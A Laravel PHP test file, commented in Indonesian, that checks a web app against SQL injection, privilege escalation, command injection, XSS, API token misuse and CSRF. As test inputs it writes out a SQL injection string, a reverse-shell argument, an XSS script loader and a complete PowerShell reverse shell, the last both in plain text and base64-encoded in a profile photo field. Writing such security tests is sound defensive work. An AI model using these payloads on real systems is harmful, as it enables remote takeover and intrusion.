<?php

namespace Tests\Feature;

use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Foundation\Testing\WithFaker;
use Tests\TestCase;
use App\Models\User;

class vulnerabilityTest extends TestCase
{

    //SQL Injection
    public function test_prevent_sql_injection_in_authentication()
    {
        $response = $this->post('/login', [
            'email' => "' OR '1'='1' --",
            'password' => 'anything',
        ]);

        $response->assertStatus(302); 

        $this->assertGuest(); //cek apakah masih jadi guest (tidak berhasil login)
    }

    //Broken Access Control
    public function test_prevent_any_user_or_hacker_accessing_admin_feature()
    {
        //user buat akun
        $user = User::factory()->create([
            'username' => 'testuser_' . rand(1000, 9999),
            'role'=>'user',
        ]);
        $this->actingAs($user);
        //user iseng ingin mengakses fitur manajemen user
        $response = $this->get('/user');
        //pengguna dilempar ke beranda dengan status code 302(moved permanently) dengan notif : access denied
        $response->assertStatus(302);
    }
    public function test_prevent_privilege_escalation_from_user_to_admin():void
    {
        $user = User::factory()->create([
            'username' => 'testuser_' . rand(1000, 9999),
            'role'=>'user',
        ]);
        $this->actingAs($user);

        $response = $this->post('/user/edit/'.$user->id, [
            '_token' => csrf_token(),
            'role' => 'admin'
        ]);
        $this->assertEquals('user', $user->fresh()->role);
    }
    public function test_prevent_privilege_escalation_from_courier_to_admin():void
    {
        $user = User::factory()->create([
            'username' => 'testuser_' . rand(1000, 9999),
            'role'=>'courier',
        ]);
        $this->actingAs($user);

        $response = $this->post('/user/edit/'.$user->id, [
            '_token' => csrf_token(),
            'role' => 'admin'
        ]);
        $this->assertEquals('courier', $user->fresh()->role);
    }

    //Remote Code Execution (Authenticated)
    public function test_prevent_any_remote_code_exec_in_form()
    {
        //Misalkan Hacker Dapat kredensial admin dan login sebagai admin
        $user = User::factory()->create([
            'username' => 'testuser_' . rand(1000, 9999),
            'role'=>'admin',
        ]);
        $this->actingAs($user);
        // hacker ingin mmemasukkan backdoor (reverse shell) untuk mengambil alih machine kita menggunakan commmand
        $maliciousInput = '127.0.0.1 1337 -e /bin/bash'; 

        // hacker memanfaatkan fitur pencarian untuk mengeksekusi perintah
        $response = $this->post('/user/search/', [
            'query' => $maliciousInput,
        ]);

        $response->assertStatus(200); 
        $response->assertDontSee("<label class=\"h4\">User Result : ".$maliciousInput."</label>");
    }
    //Cross-Site Scripting(XSS)
    public function test_prevent_any_xss_in_form()
    {
        //Misalkan Hacker Dapat kredensial admin dan login sebagai admin
        $user = User::factory()->create([
            'username' => 'testuser_' . rand(1000, 9999),
            'role'=>'admin',
        ]);
        $this->actingAs($user);
        // sama seperti RCE, tapi kita menginput javascript dan memasukkan reverse shell ke mesin aplikasi
        $maliciousInput = '<img src=x onerror=\\"with(top)body.appendChild (createElement(\'script\')).src=\'http://127.0.0.1:1337\'\">'; 

        // hacker memanfaatkan fitur pencarian untuk mengeksekusi perintah
        $response = $this->post('/user/search/', [
            'query' => $maliciousInput,
        ]);

        $response->assertStatus(200); 
        $response->assertDontSee("<label class=\"h4\">User Result : ".$maliciousInput."</label>");
    }
    public function test_prevent_any_xss_in_user_profile_picture()
    {
        $user = User::factory()->create([
            'username' => 'testuser_' . rand(1000, 9999),
            'role'=>'admin',
            //memasukkan script reverse shell dengan format base64

            //payload :
            //  powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 1337);
            //  $NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
            //  function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');
            //  $StreamWriter.Flush()}WriteToStream '';
            //  while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
            //  $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
            //payload(one-liner):
            //  powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 1337);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
            'photo'=>'data:image/jpg;charset:utf8;base64,cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEyNy4wLjAuMScsIDEzMzcpOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg=='
        ]);
        $this->actingAs($user);

        $response = $this->get('/home');
        $response->assertStatus(200); 
        //cek apakah foto user(payload) tidak akan diproses
        $response->assertDontSee("<img src=\"".$user->photo."\" alt=\"hugenerd\" width=\"30\" height=\"30\" class=\"rounded-circle\">");
    }
    //API tokenization
    public function test_get_any_user_using_proper_token(): void
    {
        $response = $this->get("api/user?token=in1C0ntoh4p1T0k3n");

        $response->assertStatus(200);
    }
    public function test_prevent_to_get_any_user_if_token_is_invalid(): void
    {
        $response = $this->get("api/user?token=4p1T0k3n");

        $response->assertStatus(403);
    }
    public function test_prevent_anonymous_creating_a_user_through_api(): void
    {
        $response = $this->post("/api/get/privilege/admin/create?name=admin&username=admin&email=example@mail.com&password=yadayada&token=4p1T0k3n");

        $response->assertStatus(403);
    }
    // Cross-Site-Request-Forgery Injection (CSRF Injection)
    public function test_wonky_website_will_returns_403_response_when_csrf_token_is_missing()
    {
        $response = $this->post('/update-email', ['email' => 'test@example.com']);

        $response->assertStatus(404);
    }

    /** @test */
    public function test_wonky_website_will_returns_403_response_when_csrf_token_is_invalid()
    {
        //kita act sebagai user yang lupa logout atau belum logout dari aplikasi kita
        $user = User::where('username','test')->firstOrFail();
        $this->actingAs($user);
        $response = $this->post('/update-email', [
            '_token' => 'invalid_csrf_token',
            'email' => 'test@example.com'
        ]);

        $response->assertStatus(404);
    }

}
